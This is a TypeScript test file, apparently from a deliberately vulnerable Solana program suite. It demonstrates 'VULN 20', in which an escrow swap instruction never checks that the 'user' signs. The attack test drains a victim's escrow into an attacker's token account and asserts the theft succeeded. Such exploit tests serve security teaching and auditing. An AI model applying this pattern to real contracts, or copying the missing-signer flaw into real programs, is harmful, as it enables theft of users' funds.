/**
 * VULN 20 — privileged PDA authority derived from an UNVALIDATED account.
 *
 * The escrow token account is owned by the escrow authority PDA derived
 * from `user`. `swap` never requires `user` to sign: the attacker passes
 * the VICTIM's key as `user` and the victim's escrow as `escrow_ta` — the
 * program itself signs the transfer with the victim's escrow PDA and sends
 * the payout to the attacker. The victim's escrow is drained without any
 * signature from the victim.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN, Keypair,
} from "./util";

describe("vuln20 escrow authority derived from an unvalidated account", () => {
  const program = anchorProgram("vuln20_escrow_authority", PROG_IDS.vuln20);
  const pool = findPda([seedsBuf("pool")[0]], PROG_IDS.vuln20)[0];

  let mintA: PublicKey, mintB: PublicKey, poolTaA: PublicKey, poolTaB: PublicKey;
  let victim: any, attacker: any;
  let victimEscrowAuthority: PublicKey, victimEscrowTa: PublicKey;
  let attackerTaB: PublicKey;

  // escrow authority PDA for any user
  const escAuthOf = (user: PublicKey) =>
    findPda([seedsBuf("escrow")[0], user.toBuffer()], PROG_IDS.vuln20)[0];

  before(async () => {
    await airdrop(provider.wallet.publicKey, 60);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    mintA = await createMint(provider.connection, provider.wallet.payer,
      provider.wallet.publicKey, null, 6);
    mintB = await createMint(provider.connection, provider.wallet.payer,
      provider.wallet.publicKey, null, 6);

    // Pool-side token accounts owned by the pool PDA.
    poolTaA = await createAccount(provider.connection, provider.wallet.payer, mintA, pool, Keypair.generate());
    poolTaB = await createAccount(provider.connection, provider.wallet.payer, mintB, pool, Keypair.generate());

    await program.methods.initialize()
      .accounts({ pool, mintA, mintB, poolTaA, poolTaB, payer: provider.wallet.publicKey })
      .rpc();

    // 10_000 B of honest liquidity; the pool pays 2 B per 1 A.
    const lpTa = await createAccount(provider.connection, provider.wallet.payer, mintB,
      provider.wallet.publicKey, Keypair.generate());
    await mintTo(provider.connection, provider.wallet.payer, mintB, lpTa,
      provider.wallet.publicKey, 10_000_000_000);
    await program.methods.fundB(new BN(10_000_000_000))
      .accounts({ pool, poolTaB, userTa: lpTa, user: provider.wallet.publicKey })
      .rpc();
  });

  it("honest swap: victim swaps 100 A of their escrow -> 200 B", async () => {
    // Victim's escrow: token account owned by escrow authority PDA.
    victimEscrowAuthority = escAuthOf(victim.publicKey);
    victimEscrowTa = await createAccount(provider.connection, victim, mintA,
      victimEscrowAuthority, Keypair.generate());

    const victimATa = await createAccount(provider.connection, provider.wallet.payer, mintA,
      victim.publicKey, Keypair.generate());
    await mintTo(provider.connection, provider.wallet.payer, mintA, victimATa,
      provider.wallet.publicKey, 1_000_000);
    await program.methods.fundEscrow(new BN(1_000_000))
      .accounts({ escrowTa: victimEscrowTa, userTa: victimATa, user: victim.publicKey })
      .signers([victim]).rpc();

    attackerTaB = await createAccount(provider.connection, victim, mintB,
      victim.publicKey, Keypair.generate());
    await program.methods.swap(new BN(100_000))
      .accounts({
        pool, poolTaA, poolTaB,
        user: victim.publicKey,                    // victim is "the user"
        escrowAuthority: victimEscrowAuthority,
        escrowTa: victimEscrowTa,
        userOutTa: attackerTaB,
        caller: victim.publicKey,                  // AND the signer (honest)
      })
      .signers([victim]).rpc();

    assert.equal((await tokenBalance(attackerTaB)).toString(), "200000");
    assert.equal((await tokenBalance(victimEscrowTa)).toString(), "900000");
  });

  it("attack: attacker drains the victim's escrow without the victim's signature", async () => {
    const attackerB = await createAccount(provider.connection, attacker, mintB,
      attacker.publicKey, Keypair.generate());
    const escrowBefore = await tokenBalance(victimEscrowTa);

    // THE BUG: `user` = victim (NOT a signer), `caller` = attacker.
    await program.methods.swap(new BN(900_000))
      .accounts({
        pool, poolTaA, poolTaB,
        user: victim.publicKey,                    // <- unvalidated "user"
        escrowAuthority: victimEscrowAuthority,
        escrowTa: victimEscrowTa,
        userOutTa: attackerB,
        caller: attacker.publicKey,                // <- the real signer
      })
      .signers([attacker]).rpc();

    // The victim's escrow is emptied into the attacker's account at the 1:2
    // rate — the victim never signed anything.
    assert.equal(await tokenBalance(victimEscrowTa), 0n);
    assert.equal(
      BigInt(escrowBefore.toString()) * 2n,
      (await tokenBalance(attackerB)) - 0n,
    );
    assert.equal((await tokenBalance(attackerB)).toString(), "1800000");
  });
});
